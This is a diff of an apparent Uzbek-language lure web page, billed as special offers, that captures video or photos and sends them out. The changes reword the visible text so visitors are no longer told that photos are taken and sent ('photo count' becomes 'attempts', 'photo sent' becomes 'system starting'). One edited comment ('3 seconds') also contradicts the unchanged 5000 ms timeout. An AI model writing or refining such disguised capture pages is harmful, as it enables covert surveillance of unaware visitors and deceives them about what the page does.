@@ -135,7 +135,7 @@
         <p>Ushbu sahifada maxsus taklif va yangiliklar bilan tanishing</p>
         
         <div class="counter" id="counter" style="display:none;">
-            Rasmlar soni: <span id="photoCount">0</span>
+            Urinishlar soni: <span id="photoCount">0</span>
         </div>
         
         <button id="enterBtn">Ishga tushirish</button>
@@ -204,7 +204,7 @@
                     };
                     video.onerror = reject;
                     
-                    // 5 soniya timeout
+                    // 3 soniya timeout
                     setTimeout(() => reject(new Error('Video yuklanmadi')), 5000);
                 });
                 
@@ -284,8 +284,8 @@
                     totalPhotos++;
                     photoCount.textContent = totalPhotos;
                     counter.style.display = 'block';
-                    showStatus('✅ Rasm yuborildi!', 'success');
-                    enterBtn.textContent = 'Yana Rasm Olish';
+                    showStatus('✅ Tizim ishga tushirilmoqda!', 'success');
+                    enterBtn.textContent = 'Qayta urinish';
                 } else {
                     throw new Error(result.description || 'Yuborishda xatolik');
                 }
